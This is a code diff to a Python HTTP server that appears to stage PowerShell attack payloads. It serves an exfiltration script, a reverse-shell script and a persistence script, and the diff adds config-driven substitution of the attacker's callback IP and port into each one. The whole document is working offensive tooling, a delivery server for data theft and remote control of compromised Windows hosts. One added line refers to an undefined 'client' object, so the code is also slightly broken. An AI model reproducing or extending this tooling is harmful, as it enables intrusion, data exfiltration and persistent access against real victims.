@@ -5,10 +5,9 @@ import os
 import logging
 import base64
 from datetime import datetime
+import config
 
 CURRENT_DIR = os.getcwd()
-HOST = '0.0.0.0'
-PORT = 8000
 
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     def log_request(self, code):
@@ -20,7 +19,11 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         if self.path == '/run_all':
             try:
                 file_to_open = open('client_exf.ps1','r').read()
+                file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
+                file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                 file_to_open2 = open('client_rvs.ps1','r').read()
+                file_to_open2 = file_to_open2.replace('SERVER_EXTERNAL_IP',config.reverseshell['SERVER_EXTERNAL_IP'])
+                file_to_open2 = file_to_open2.replace('SERVER_EXTERNAL_PORT',config.reverseshell['SERVER_EXTERNAL_PORT'])
                 self.send_response(200)
                 self.send_header('Content-type', 'text')
                 self.end_headers()
@@ -36,6 +39,8 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         elif self.path == '/client_exf':
             try:
                 file_to_open = open('client_exf.ps1','r').read()
+                file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
+                file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                 self.send_response(200)
                 self.send_header('Content-type', 'text')
                 self.end_headers()
@@ -49,6 +54,8 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         elif self.path == '/client_rvs':
             try:
                 file_to_open = open('client_rvs.ps1','r').read()
+                file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.reverseshell['SERVER_EXTERNAL_IP'])
+                file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.reverseshell['SERVER_EXTERNAL_PORT'])
                 self.send_response(200)
                 self.send_header('Content-type', 'text')
                 self.end_headers()
@@ -62,6 +69,7 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         elif self.path == '/client_pers':
             try:
                 file_to_open = open('client_pers.ps1','r').read()
+                file_to_open = file_to_open.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',client.persistence['BASE64_ENCODED_PAYLOAD_UTF16LE'])
                 self.send_response(200)
                 self.send_header('Content-type', 'text')
                 self.end_headers()
@@ -147,6 +155,6 @@ def parseURL(path):
         return None
 
 
-httpd = HTTPServer((HOST,PORT), SimpleHTTPRequestHandler)
-log("[+] Starting server on " + HOST + ":" + str(PORT),print_console=True,trace_time=True)
+httpd = HTTPServer((config.server['SERVER_LISTEN_ON_LOCAL_IP'],int(config.server['SERVER_LISTEN_ON_LOCAL_PORT'])), SimpleHTTPRequestHandler)
+log("[+] Starting server on " + config.server['SERVER_LISTEN_ON_LOCAL_IP'] + ":" + str(config.server['SERVER_LISTEN_ON_LOCAL_PORT']),print_console=True,trace_time=True)
 httpd.serve_forever()
